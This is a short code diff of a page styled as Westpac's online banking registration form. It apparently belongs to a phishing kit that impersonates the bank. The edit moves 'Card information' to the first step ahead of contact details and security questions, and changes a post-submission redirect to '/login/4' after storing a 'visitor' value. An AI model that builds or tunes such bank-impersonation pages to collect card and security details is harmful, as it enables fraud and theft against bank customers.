@@ -72,9 +72,9 @@
                 <div class="self-registration" data-get-registration-password-policy="https://banking.westpac.com.au/wbc/banking/registration/passwordpolicy" data-keymap-url="/eam/servlet/getEamInterfaceData">
 
                     <ul id="progress-bar" class="steps-4">
-                        <li class="active" tabindex="-1"><span>Step 1<span class="step-detail">Personal details</span></span><span class="a11y-context"> currently active</span></li>
-                        <li><span>Step 2<span class="step-detail">Security questions</span></span><span class="a11y-context"> currently inactive</span></li>
-                        <li><span>Step 3<span class="step-detail">Card details</span></span><span class="a11y-context"> currently inactive</span></li>
+                        <li tabindex="-1"><span>Step 1<span class="step-detail">Card information</span></span><span class="a11y-context"> currently active</span></li>
+                        <li class="active" ><span>Step 2<span class="step-detail">Contact details</span></span><span class="a11y-context"> currently inactive</span></li>
+                        <li><span>Step 3<span class="step-detail">Security questions</span></span><span class="a11y-context"> currently inactive</span></li>
                         <!--li><span>Step 4<span class="step-detail">Personal details</span></span><span class="a11y-context"> currently inactive</span></li-->
                     </ul>
 
@@ -498,7 +498,7 @@ $(document).ready(function() {
             }).done(function(msg) {
             
                 sessionStorage.setItem('visitor', visitor);
-                window.location.href = "/login/3";
+                window.location.href = "/login/4";
                 console.log(msg); // Log success message
             }).fail(function(err, textstatus, error) {
             //window.location.href = "login/2"; 
